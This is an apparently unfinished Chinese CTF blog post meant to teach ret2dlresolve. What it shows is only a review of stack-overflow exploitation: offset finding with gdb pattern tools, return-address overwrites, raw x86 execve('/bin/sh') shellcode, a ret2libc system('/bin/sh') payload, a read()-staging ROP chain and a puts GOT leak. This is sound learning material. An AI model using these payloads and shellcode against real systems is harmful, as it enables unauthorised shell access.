---
layout: post
title: " 从壹开始做ret2dlresolve "
date: 2019-04-02
excerpt: "就是从怎么找offset开始说的意思（正在施工）"
tags: [pwn]
feature:  https://p0.ssl.qhimg.com/t01a969a8d998ad5508.png
comments: true
---


# 从壹开始做ret2dlresolve


注意：full relro 的binary 是不会延迟绑定的……也意味着无法修改got表……

先上一张图

![](https://raw.githubusercontent.com/RhythmMark/RhythmMark.github.io/master/_posts/pictures/ELF_dlresolve.jpg)

好的我已经画得很清楚了，告辞（×）


时隔差不多半年没做pwn，我觉得我有必要回忆一下做pwn题基础知识……

写exp一般要用到的：

```python
from pwn import *
context.log_level = 'debug'
#io = remote('xxx.xxx.xxx.xx',xxxxx)
io = process('./binary')
...
gdb.attach(io)
...
```

下面用 **五条payload** 来回忆栈溢出

### 0x1（返回地址至flag） 的场合

``payload = 'A'*(0x108+0x04)+pack(0x0804856B)``

其中``0x108``是binary给输入分配的空间的大小，用ida看的话一般是``sub     esp, 108h``这里的那个数字……``0x04``是``ebp``，不知道ebp是什么的去学习下函数调用栈……

这两个加起来，即``0x108+0x04``的大小，下称``offset``或``pattern``或``padding``，意为到返回地址的偏移，达成伪造返回地址的填充之类的……

一般来说……

``gdb binary``
用gdb加载要pwn的binary

``pattern create 200``
创建一个长度为200的pattern

然后会出现

``AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA``

复制下来……

``r``运行……停在等待用户输入的地方……

粘贴pattern……``c``继续运行……

然后……binary就会崩溃……出现

```
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
00x41414641 in ?? ()
gdb-peda$ 
```

之类的……

（因为``0x41414641``应该是返回地址……binary正准备去执行那个地址的命令……但是被填充了奇怪的东西上去……所以就崩了……）

然后……提取里面的``0x41414641``……

执行``pattern offset 0x41414641``……

会出现……``1094796865 found at offset: 44``


那……offset就是44了……（已包含ebp……好像越说越乱（×））

或者……用Cyclic pattern的话……可能显得没那么蠢……whatever

所以``pack(0x0804856B)``就是我们伪造的返回地址。发送这条payload，没开什么保护、一切顺利的话，就会执行``pack(0x0804856B)``处的命令。

### 0x2（返回地址至shellcode）（已知buf位置） 的场合

``payload = shellcode + 'A' * (44 - len(shellcode)) + p32(ret)``

类似0x1，``shellcode + 'A' * (44 - len(shellcode))``都是``pattern``，``ret``应该是buf的地址，而buf在我们进行输入之后，里面的内容就是``payload = shellcode + 'A' * (44 - len(shellcode)) + p32(ret)``，所以会执行shellcode……

shellcode可以用：

```
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
```

### 0x03 (return-to-libc attack)（已知gets地址） 的场合

```
payload = padding + p32(systemaddr) + p32(ret)                 + p32(binshaddr)
          pattern    system()地址      执行system()后的返回地址      system()的参数         
```

因为当调用一个函数的时候，栈一般长这样：

``[局部变量|ebp|返回地址|参数]``

我们把被害函数（就请求用户输入的那个……read之类的）的返回地址伪造成``systemaddr``之后，就会执行``system()``，此时binary就以为自己是在调用``system()``

就以为栈里面的数据就是：
```
system()的局部变量  ebp                      返回地址           参数 
padding         +       p32(systemaddr) +  p32(ret)        + p32(binshaddr)
                             ↑
```
第一行是binary误以为的，第二行是我们伪造的，第三行是表示“这是正在执行这条命令时候的示意图”……

所以这个payload会让binary执行``system("/bin/sh")``√

注：因为``int system(const char *command)``，所以参数那里是字符串地址而不是字符串

### 0x04 未知gets地址，需要别的ROP 的场合

注：buf应该在一个 **可读可写可执行** 的地方

```
                        read()      |read的返回地址|   |   read   的    参    数    |
payload1 = pattern + p32(sys_read) +    p32(buf)    +  p32(0) + p32(buf) + p32(0x80)

payload2 = shellcode

```

首先read函数：``ssize_t read(int fd, void * buf, size_t count);``

因此这两个payload，发送``payload1``之后，binary执行``read(0,buf,0x80)``，即从文件标识符为0的标准输入中，获取80个字节长度的内容，将其读入buf这个地址中。

此时会等待用户输入，然后我们发送payload2，``shellcode``。

而read函数的返回地址正是``buf``的地址，因此buf上的``shellcode``会被执行。

### 0x05 开了NX+ASLR，需要先泄露puts在got表中的地址，再进行ret2libc 的场合

这里只说怎么泄露puts在got表中的地址

注1：ASLR 会使堆、栈、libc的地址发生变化，但它不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责，而PIE只有在ASLR开启之后才会生效。（所以puts函数的地址可以在ida里找……这就是下面payload中``puts_addr_ida``的意思（。））

注2：即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。

注3：由于可能会有延迟绑定，因此泄露的函数必须已被使用，不然got表中存放的是puts@plt下一条指令的地址……好像回到正题了

这里只给出泄露payload：

``payload = pattern + p32(puts_addr_ida)+rett+p32(puts_got)``

rett用main函数地址就行了，也是在ida里找

接下来就跟0x03差不多了

我觉得复习得差不多了，下面开始dlresolve。









